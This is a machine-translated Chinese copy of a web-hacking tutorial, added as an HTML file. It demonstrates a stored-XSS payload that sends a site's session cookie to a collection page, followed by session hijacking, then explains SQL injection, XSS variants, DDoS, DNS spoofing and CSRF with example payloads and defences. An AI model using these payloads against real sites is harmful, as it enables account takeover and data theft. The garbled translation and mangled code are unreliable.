@@ -1,0 +1,275 @@
+<html>
+<head>
+<title>How to Hack a Website: Step-by-Step Website Hacking Guide 2023</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>如何黑网站:分步网站黑客指南2023</h1>
+<blockquote>原文：<a href="https://hackr.io/blog/how-to-hack-a-website#0001-01-01">https://hackr.io/blog/how-to-hack-a-website#0001-01-01</a></blockquote><div><div class="content">
+										<p>当你想象一个黑客时，你会想到什么？也许是一个戴着兜帽的罪犯，用超级电脑技术窃取信息。事实是，对于那个黑客来说，学习如何黑一个网站并不困难。而且，也不是所有的网站黑客都是犯罪！</p>
+<p>一些公司雇佣黑客来测试他们的电脑安全，比如银行、零售店和T2政府机构。</p>
+<p>如果你对网页黑客感兴趣，你来对地方了。今天，我们将介绍如何入侵网站的步骤，并向您介绍不同类型的网络攻击和防范方法。</p>
+<p>我们开始吧！</p>
+
+<h2 id="how-to-hack-a-website-step-by-step-different-ways-to-hack-a-website"><strong>如何一步一步黑网站:黑网站的不同方法</strong></h2>
+<p>黑客有几种方法来执行网站黑客行为。他所需要的是找到网站中的脆弱点，以进入并获得关键信息。在这篇文章中，我们提到了一些可以用来入侵网站的惊人技巧。</p>
+<h3 id="toc-1-hacking-online-website"><strong> 1。黑客在线网站</strong></h3>
+<p>如何黑掉一个网站并改变它的第一种方法是黑掉一个在线网站。我们将以黑客“<a href="http://www.techpanda.org" target="_blank" rel="noopener">www.techpanda.org</a>”为例来演示网页黑客攻击的步骤。在这个场景中，我们将读取cookie会话ID并模拟一个用户会话来获取管理信息。</p>
+<p>通过借助<a href="https://portswigger.net/support/using-sql-injection-to-bypass-authentication" target="_blank" rel="noopener"> SQL注入绕过认证方法</a>，我们可以获得登录凭证。然后，按照以下步骤操作:</p>
+
+<p><img src="../Images/db173998cc0cc0d447f876cb24254390.png" alt="dashboard" data-original-src="https://hackr.io/blog/media/img1-min.png"/></p>
+<ul>
+<li>选择添加新联系人。</li>
+<li>在“名字”字段中输入以下信息。</li>
+</ul>
+<p><a href="#" onclick="\”document.location=\’&lt;a" target="_blank" rel="noopener">http://techpanda.org/snatch_sess_id.php?c = \ '+escape \(document . cookie \)\；\</a>&gt;黑暗&lt;/一&gt;</p>
+<p>它是添加一个带有点击事件的超链接的JavaScript代码。单击它时，事件检索PHP cookie会话id，并将其与URL中的会话ID一起发送到snatch_sess_id.php页面。</p>
+
+<p><img src="../Images/0c32cda60bef75286c547b49e111cf59.png" alt="dashboard" data-original-src="https://hackr.io/blog/media/img2-min.png"/></p>
+<ul>
+<li>输入其他信息，然后单击保存。</li>
+</ul>
+<p><img src="../Images/eb4cdc3f30eaf42fc9856953bcbf81e7.png" alt="dashboard" data-original-src="https://hackr.io/blog/media/img3-min.png"/></p>
+<ul>
+<li>您将获得如下所示的新条目。</li>
+</ul>
+<p><img title="How to hack a Website" src="../Images/eea72e4b53aa97a1aa21bb5a7794552a.png" alt="How to hack a Website" data-original-src="https://lh4.googleusercontent.com/vH-QxvMCrpcVMsUIIUxUhlN5I2vBl46lhKmmewCIlGfVCXkdOLSPPW_oNLq4X0-DImoWjX_GEBjYTJNstXdnWvuaUWFvfzmA8fYQ8fp6I8GQ-M6Y1ZsB1A5kBTaYCAOMw1YSLeCG"/></p>
+<ul>
+<li>跨站点脚本代码存储在数据库中，每次具有访问权限的用户登录时都会被加载。</li>
+<li>每当管理员点击黑色条目时，他将得到一个窗口，在URL中显示会话id。</li>
+</ul>
+<p><img title="How to hack a Website" src="../Images/973d6d1edb4c3ccd01fb422806bc86bd.png" alt="How to hack a Website" data-original-src="https://lh4.googleusercontent.com/75LHYTph0FEekTCCqcOObSI4bQkRwv4Sw3-7zbjC1X1zgZyMNKO24y4umBKG4TpTBfxzCGVJ7Hqn1X9ug2J60E1Rkc6qBvCU6_k3nekrC49_-JF1Ewnf1RvTgRy-cZ904brzcYfS"/></p>
+<h3 id="toc-2-session-impersonation"><strong> 2。会话模拟</strong></h3>
+<p>要进行这种攻击，您必须使用篡改数据插件。篡改数据是Firefox中常用的扩展。您可以篡改客户端和服务器之间发送的数据，并获取和发布元素数据。我们已经指定了如何安装一个篡改数据加载项，详细步骤如下。</p>
+<ul>
+<li>你需要火狐和篡改数据插件。</li>
+<li>打开Firefox安装tamper data插件，如下图所示。</li>
+</ul>
+<p><img src="../Images/848db1845d5bc66a3165152b385d725c.png" alt="dashboard" data-original-src="https://hackr.io/blog/media/img6-min.png"/></p>
+<ul>
+<li>查找篡改数据，并按照下图进行安装。</li>
+</ul>
+<p><img src="../Images/fbaa5064a6d3c3e49ae258115dd2167b.png" alt="dashboard" data-original-src="https://hackr.io/blog/media/img7-min.png"/></p>
+<ul>
+<li>现在，点击接受并安装。</li>
+</ul>
+<p><img src="../Images/49753a4726acca24575adcf0c7b0c18d.png" alt="" data-original-src="https://hackr.io/blog/media/img8-min.png"/></p>
+<ul>
+<li>安装完成后，您将看到如下所示的“立即重启”按钮。</li>
+</ul>
+<p><img src="../Images/4bb9ab81d6db4f47bd9ef79731e51fb1.png" alt="" data-original-src="https://hackr.io/blog/media/img9.png"/></p>
+<ul>
+<li>现在转到Firefox浏览器的菜单栏，如下所示。</li>
+</ul>
+<p><img src="../Images/0544db4d463da88180679bacc23b6256.png" alt="" data-original-src="https://hackr.io/blog/media/img10-min.png"/></p>
+<ul>
+<li>转到工具并选择篡改数据</li>
+</ul>
+<p><img src="../Images/6b6d56e71a42f6c89811b93fa89813d1.png" alt="" data-original-src="https://hackr.io/blog/media/img11-min.png"/></p>
+<ul>
+<li>点击开始，你会看到下面的窗口。</li>
+</ul>
+<p><img src="../Images/a19c9dd93303667d08f0e9f84a26c4fa.png" alt="" data-original-src="https://hackr.io/blog/media/img12-min.png"/></p>
+
+<p><img src="../Images/6e8f5cf4183f4f76d2d26afa1ae05478.png" alt="" data-original-src="https://hackr.io/blog/media/img14-min.png"/></p>
+<ul>
+<li>你会看到下面的窗口。</li>
+</ul>
+<p><img src="../Images/bc737b97e75faf6c05c827df86fe910a.png" alt="" data-original-src="https://hackr.io/blog/media/img14-min-1.png"/></p>
+<ul>
+<li>现在，从攻击URL复制PHPSESSID并粘贴到cookie字段，然后单击ok，如上所示。</li>
+<li>你会钻到窗户下面。</li>
+</ul>
+<p><img src="../Images/dffa31654f577d07cf9c85debab24548.png" alt="" data-original-src="https://hackr.io/blog/media/img15-min.png"/></p>
+<ul>
+<li>取消选中继续选项并提交。</li>
+<li>您将看到下面的仪表板。</li>
+</ul>
+<p><img src="../Images/14ecf507a5c74f4b601ebc6b6eb8eec9.png" alt="" data-original-src="https://hackr.io/blog/media/img16-min.png"/></p>
+<h2 id="different-types-of-cyber-attacks"><strong>不同类型的网络攻击</strong></h2>
+<p>不幸的是，黑客可以通过几种不同的方式进入公司的网络空间。以下是一些不同网络攻击的例子。</p>
+<h3 id="toc-1-sql-injection-attack"><strong> 1。SQL注入攻击</strong></h3>
+<p>SQL注入攻击需要黑客向应用程序提供恶意的SQL查询。该查询使黑客能够从数据库中读取重要信息，甚至执行未经授权的命令，从而导致重要数据丢失和受损。</p>
+<p>这种类型的网络攻击赋予黑客伪造身份、更改数据、导致欺诈和损害公司声誉的能力。这些攻击在PHP和ASP应用程序中很普遍，因为它们有旧的接口。注入攻击的严重程度取决于黑客的熟练程度。如果网站没有适当的安全措施保护，它很容易被利用。</p>
+<p><img src="../Images/4fc5d322a726bb33c10bdab225867c37.png" alt="" data-original-src="https://hackr.io/blog/media/img17-min.png"/></p>
+<h4 id="different-types-of-sql-injection-attacks"><strong>不同类型的SQL注入攻击</strong></h4>
+<p>根据他们访问数据和破坏数据的方式，攻击分为三类。这些是带内SQLi(经典)、推断SQLi(盲)和带外SQLi。</p>
+<ul>
+<li><strong>带内SQLi: </strong>如果使用的SQL很容易被黑，是可以的。在这种类型的SQL注入攻击中，黑客使用网络中的相同通道来发起攻击并获取数据。它有下面提到的两种不同的变体。</li>
+<li><strong>基于错误的SQLi: </strong>由于攻击者的操作，数据库产生错误消息。根据结果，攻击者可以了解特定应用程序的数据库结构。</li>
+<li><strong>基于联合的SQLi: </strong>这种技术使用联合SQL操作符，合并多个select语句，并将它们转换成包含应用程序必要信息的单个HTTP响应。</li>
+<li><strong>推理(盲)SQLi: </strong>在这种攻击下，黑客会向服务器发送海量数据，观察服务器的响应和行为。通过这种方式，攻击者将分析关于其结构的信息。在这里，攻击者看不到实际的数据，因为它没有从网站数据库传输回攻击者。这种攻击会降低服务器进程的速度。SQL盲注入有如下两种变体:</li>
+<li><strong>布尔:</strong>一个SQL查询被发送到数据库，攻击者分析查询的输出，不管是真还是假。此外，HTTP响应中的数据也会相应地改变。</li>
+<li><strong>基于时间:</strong>这个查询让数据库在反应之前等待几秒钟。攻击者分析响应该查询所花费的时间。它将根据花费的时间创建HTTP响应。攻击者可以在不进入实际数据库的情况下假设结果。</li>
+<li><strong>带外SQLi: </strong>只有在数据库服务器上启用了某些功能时，才会发生这种攻击。这取决于服务器创建向攻击者传输数据的DNS或HTTP请求的能力。如果任何方法都不能提供攻击者所期望的结果，他们就会采用这种技术。</li>
+</ul>
+<h4 id="how-does-sql-injection-work"><strong>SQL注入是如何工作的？</strong></h4>
+<p>攻击者可能会选择以下方式来实施SQL注入攻击。攻击者可以选择以下任何一种方式。</p>
+<ul>
+<li>在用户输入字段中注入SQL查询:在这里，黑客将SQL查询输入到用户输入字段，并将它们传递给数据库进行处理。如果数据库接受输入而不进行处理，攻击者就可以为所欲为。</li>
+<li>通过cookie注入SQL查询:攻击者试图从存储的cookie中获取数据，因此他们在设备上放置恶意软件来修改cookie数据，并在那里注入查询以访问数据库。</li>
+<li>通过HTTP头注入SQL查询:如果应用程序从HTTP头获取输入并访问数据库，攻击者可以在HTTP头中注入查询。</li>
+</ul>
+<h4 id="impact-of-sql-injection"><strong>SQL注入的影响</strong></h4>
+<ul>
+<li>绕过身份验证并冒充其他用户来访问数据库。</li>
+<li>渗透/窃取数据，以使用它自己的利益。</li>
+<li>修改关键数据导致欺诈。</li>
+<li>删除数据会损害名誉。</li>
+<li>运行任意代码取乐。</li>
+<li>获得对系统本身的根访问权限并执行SQL。</li>
+</ul>
+<h4 id="example"><strong>例子</strong></h4>
+<p>首先，攻击者会找到漏洞，然后注入SQL查询。按照下面的例子，攻击者获取特定产品的必要信息，可以修改为http://www.estore.com/product/product.asp?productid=999或1=1。这将把下面的查询发送到数据库-</p>
+<pre class="language-sql"><code>SELECT ProductName,ProductDescription
+FROM Product
+WHERE ProductNumber = 999OR1=1</code></pre>
+<p>由于条件1=1，该语句将始终为真，并返回所有产品详细信息。</p>
+<h4 id="how-to-prevent-this-attack"><strong>如何防止这种攻击？</strong></h4>
+<p>您可以通过净化输入来识别访问关键数据的未授权用户，从而防止这种攻击。</p>
+<h3 id="toc-2-cross-site-scripting-attack"><strong> 2。跨站脚本攻击</strong></h3>
+<p>在这种攻击中，黑客冒充受害者来获取受害者数据。这些攻击也称为XSS，会破坏用户与应用程序的交互。在这种攻击下，攻击者会创建相同的环境来区分不同的网站。如果攻击者获得了对特定应用程序的特权访问，他们就可以损害应用程序中存储的重要数据。</p>
+
+<p>攻击从受害者访问应用程序或网页开始。攻击者在受害者的web浏览器中执行恶意JavaScript代码。一旦用户访问网页，网页就充当传递注入代码的工具。攻击者可以在网页中注入代码的一些例子有论坛、评论等。</p>
+<h4 id="impact-of-cross-site-scripting-attacks"><strong>跨站点脚本攻击的影响</strong></h4>
+<p>以下是对用户的一些影响:</p>
+<ul>
+<li>渗透/窃取数据，以使用它自己的利益。</li>
+<li>修改关键数据导致欺诈。</li>
+<li>删除数据会损害名誉。</li>
+<li>运行任意代码取乐。</li>
+</ul>
+<h4 id="how-to-prevent-cross-site-scripting-attacks"><strong>如何防范跨站脚本攻击</strong></h4>
+<p>确保实施以下策略来防止这种攻击的发生。</p>
+<ul>
+<li>确保应用程序的表单过滤掉了用户提供的输入。</li>
+<li>始终对输出数据进行编码，以确保安全性。</li>
+<li>确保使用适当的响应头。</li>
+<li>此外，实施与内容相关的安全策略。</li>
+</ul>
+<h4 id="different-types-of-xss"><strong>不同类型的XSS </strong></h4>
+<p>有三种不同类型的攻击可用。</p>
+<ul>
+<li><strong>反映跨站脚本攻击</strong></li>
+</ul>
+<p>这种类型的攻击很容易创建。攻击者在应用程序的HTTP请求中提供代码，并通过即时响应获取数据。</p>
+<p>例如:</p>
+<p>https://xyz-website.com/status?message=<script>/*+malicioud代码...+*/ </script> <p>状态:<script> /*恶意代码...*/ </script> </p></p>
+<p>每当用户单击应用程序HTTP请求并访问上述URL时，注入的脚本将在web浏览器中执行。该脚本可以获取必要的信息，删除数据等。</p>
+<ul>
+<li><strong>存储的跨站点脚本</strong></li>
+</ul>
+<p>在这种攻击中，应用程序可能会从不受信任的来源接收数据，并将该数据包含在HTTP响应中供服务器处理。</p>
+<p>数据可以通过HTTP请求注入到应用程序中。例如，客户订单上的备注、联系方式等。</p>
+
+<p>例如:</p>
+
+<p>应用程序的评论部分允许用户提交消息，如下所示。</p>
+<pre class="language-markup"><code>&lt;p&gt;Hello, data&lt;/p&gt;</code></pre>
+<p>攻击者可以很容易地发送消息，甚至可以伤害可以从评论部分访问该消息的其他用户。</p>
+<pre class="language-markup"><code>&lt;p&gt;&lt;script&gt;/* malicious code... */&lt;/script&gt;&lt;/p&gt;</code></pre>
+<ul>
+<li><strong>基于DOM的跨站点脚本</strong></li>
+</ul>
+<p>当应用程序让客户端<a href="https://hackr.io/blog/how-to-learn-javascript" target="_blank" rel="noopener"> JavaScript </a>处理来自不可信来源的数据并将数据写回DOM时，就会发生这种攻击。</p>
+<p>在下面提到的例子中，JavaScript代码从输入字段读取值，并将提供的值提供给HTML元素，如下所示。</p>
+<pre class="language-javascript"><code>var search = document.getElementById('search').value;
+var results = document.getElementById('results');
+results.innerHTML = 'You searched for: ' + search;
+
+</code></pre>
+<p><span>如果攻击者控制了输入字段的值，他们可以插入恶意值来执行:</span></p>
+<p>您搜索了:</p>
+<pre class="language-markup"><code>&lt;img src=1 onerror='/* malicious code... */'&gt;</code></pre>
+<h3 id="toc-3-denial-of-service-attack-ddos-dos">3.拒绝服务攻击</h3>
+<p>分布式拒绝服务(DDoS)攻击通过向目标服务器发送大量请求来影响目标服务器的正常流量。它们通常在受恶意软件感染的互联设备网络中进行，并由攻击者远程控制。这些单独的设备被称为机器人，攻击者将向其发送远程指令来执行。当一个bot以服务器为目标时，它会向目标的IP地址发送一个请求，使服务器崩溃，从而导致严重的破坏。</p>
+<p><img src="../Images/c1e4ccbd58295571fac06722a39a9e53.png" alt="DDOS" data-original-src="https://hackr.io/blog/media/img18-min.png"/></p>
+<h4 id="different-types-of-ddos-attack"><strong>不同类型的DDoS攻击</strong></h4>
+<p>以下是攻击者通常实施的不同类型的DDoS攻击。</p>
+<ul>
+<li><strong> TCP连接攻击:</strong>这种攻击会占用你所有的连接，比如负载平衡器、防火墙、应用服务器，导致处理实际请求的延迟。</li>
+<li><strong>容量攻击:</strong>针对目标网络内或目标网络与互联网之间的应用带宽造成拥塞。</li>
+<li><strong>碎片攻击:</strong>这使得TCP或UDP碎片溢出到受害者的流中，降低了性能。</li>
+<li><strong>应用攻击:</strong>淹没特定应用的方面，导致产生低流量。</li>
+<li><strong> DNS反射:</strong>攻击者伪造受害者的IP，向DNS服务器发送一个小请求，向用户发送一个大范围的回复。</li>
+</ul>
+<h4 id="impact-of-ddos-attacks"><strong>DDoS攻击的影响</strong></h4>
+<p>下面是在服务器和机器中可以看到的影响。</p>
+
+<ul>
+<li>来自特定IP地址的流量不必要的增加。</li>
+<li>来自具有相同行为特征(如设备类型、地理位置等)的特定用户组的流量意外增加。</li>
+<li>有时，发送到单个页面或端点的请求会增加。</li>
+<li>奇数日交通高峰。</li>
+</ul>
+<h4 id="how-to-prevent-ddos-attacks"><strong>如何防范DDoS攻击</strong></h4>
+<p>以下是一些防止DDoS攻击的方法。</p>
+
+<ul>
+<li>限制网络服务器路由器的速率。</li>
+<li>在路由器上添加适当的过滤器，以阻止来自可疑来源的数据包。</li>
+<li>设置连接的强制超时。</li>
+<li>使用强大的防火墙抵御DDoS攻击。</li>
+<li>使用Akamai、Cloudflare、VeriSign、Arbor Networks等厂商的第三方DDoS缓解软件。</li>
+</ul>
+<p><a class="btn btn-primary btn-call-to-action btn-block" href="https://click.linksynergy.com/link?id=jU79Zysihs4&amp;offerid=1045023.3931386&amp;type=2&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Fwebsite-hacking-penetration-testing-tools%2F" target="_blank" rel="noopener">网站黑客/渗透测试</a></p>
+<h3 id="toc-4-dns-spoofing-attack"><strong> 4。DNS欺骗攻击</strong></h3>
+<p>域名系统(DNS)中毒和欺骗主要利用DNS服务器的漏洞，将流量从合法服务器转移到假冒服务器。如果受害者访问了欺诈性页面，他将被转移到另一个对您的系统造成损害的网站。这种攻击的主要影响是数据窃取。</p>
+<p>为了进行这种攻击，客户端向DNS服务器请求IP地址。然后，他们会收到一个包含虚假IP地址的响应，没有与客户端请求的地址建立连接。因此，请求被发送到恶意主机，主机将合法网站返回给客户端，但没有安全证书。</p>
+<h4 id="different-types-of-dns-spoofing-attack"><strong>不同类型的DNS欺骗攻击</strong></h4>
+<p>以下是不同类型的DNS欺骗攻击。</p>
+
+<p>在这种攻击下，攻击者修改数据并向本地设备添加恶意代码。受害者无法分辨其中的区别，也不知道他们的系统是否受到了任何损害。但是，对于请求的主机名，将返回不正确的IP地址。攻击将持续下去，直到篡改被纠正。例如，更改DNS服务器的详细信息、篡改本地系统上的主机文件、劫持本地路由器等。</p>
+<ul>
+<li><strong> DNS服务器响应攻击</strong></li>
+</ul>
+<p>也称为中间人攻击，攻击者假装成受害者并发送恶意响应。这种攻击是可能的，因为DNS流量使用未加密的用户数据报协议，因此无法验证DNS响应的真实性。</p>
+
+<p>这种类型的DNS欺骗攻击以有效的DNS服务器为目标，并影响许多用户。例如，毒害服务器上的DNS缓存，劫持DNS服务器等。</p>
+<h4 id="how-to-prevent-dns-spoofing-attacks"><strong>如何防止DNS欺骗攻击</strong></h4>
+<p>以下是防止DNS欺骗攻击的方法-</p>
+<ul>
+<li>限制递归查询并防止潜在的中毒攻击。</li>
+<li>仅存储与请求的域相关的数据。</li>
+<li>将响应限制为仅关于所请求的域。</li>
+<li>强制客户端使用HTTPS。</li>
+</ul>
+<h3 id="toc-5-cross-site-request-forgery-attack"><strong> 5。跨站请求伪造攻击</strong></h3>
+<p>跨站点请求伪造(CSRF)攻击受害者，并在没有授权访问的web应用程序上执行攻击者预期的一些不需要的操作。攻击者诱骗受害者执行攻击者选择的一些非法操作。</p>
+<p>如果万一，受害者是经常使用者；攻击者只能执行转移资金、更改电子邮件地址等操作。如果受害者拥有管理权限，CSRF可以影响整个web应用程序。</p>
+<p>主要影响是服务器状态改变、数据泄露和非法转移资金。</p>
+<p><img src="../Images/16ee54e06cf1befa37092a48b6b95bdc.png" alt="CSRF" data-original-src="https://hackr.io/blog/media/img19-min.png"/></p>
+<h4 id="how-cross-site-request-forgery-attacks-work"><strong>跨站点请求伪造攻击的工作原理</strong></h4>
+<p>当受害者试图访问网站时，浏览器会自动从保存的cookies中挑选他们的凭据，以使登录过程无缝进行。一旦用户传递了他们的登录凭证，网站就不能区分伪造的和合法的请求。在这种情况下，攻击者可以很容易地冒充受害者。攻击者通常遵循以下流程:</p>
+<ul>
+<li>攻击者使用社会工程方法来影响受害者点击恶意代码链接。</li>
+<li>该链接将触发对目标站点的请求。</li>
+<li>该请求应该来自具有相同凭据的用户，并利用保存的数据登录到网站。</li>
+<li>网站响应传入的请求，并执行攻击者请求的操作。</li>
+</ul>
+<h4 id="example-of-cross-site-request-forgery-attack"><strong>跨站点请求伪造攻击示例</strong></h4>
+<p>下面是一个简单的GET请求5000美元银行转账的例子:</p>
+<pre class="language-javascript"><code>GET https://abank.com/transfer.do?account=RandPerson&amp;amount=$5000 HTTP/1.1</code></pre>
+<ul>
+<li>攻击者可以使用以下代码修改脚本，向他们的帐户转账5000美元:</li>
+</ul>
+<pre class="language-javascript"><code>GET https://abank.com/transfer.do?account=SomeAttacker&amp;amount=$5000 HTTP/1.1</code></pre>
+<h4 id="how-to-prevent-cross-site-request-forgery-attacks"><strong>如何防止跨站请求伪造攻击</strong></h4>
+<p>以下是防止这种攻击的最佳实践:</p>
+<ul>
+<li>确保您在不使用时总是注销已登录的web应用程序。</li>
+<li>使用强有力的用户名和密码以避免伪造。</li>
+<li>尽量不要访问并行浏览器来做关键工作。</li>
+</ul>
+<h2 id="conclusion"><strong>结论</strong></h2>
+<p>我们只提到了一个简单的<a href="https://hackr.io/blog/how-to-create-a-website-using-html">网站</a>上最常见的攻击，那里的安全性没有得到维护。今天，技术变得如此先进，以至于它可以帮助攻击者得到他们想要的东西。他们需要的只是正确使用网络内的通信。每个组织和网站都有其独特的安全策略和一些可靠的策略。但是一些黑客可以侵入你的系统，制造一个错误。</p>
+<p>如果你想避免这样的攻击来保护你的网站的完整性，那么你必须了解一个网站是如何被黑客攻击的，以及可以采取什么措施来避免它们。通读这篇文章，找到你的网站的潜在威胁点，并消除这些威胁。</p>
+<p>有兴趣了解更多关于网站安全的信息吗？查看这些<a href="https://hackr.io/tutorials/learn-information-security-ethical-hacking">信息安全和道德黑客教程。</a></p>
+<p><strong>人们也在阅读:</strong></p>
+
+
+									</div>
+
+									</div>    
+</body>
+</html>
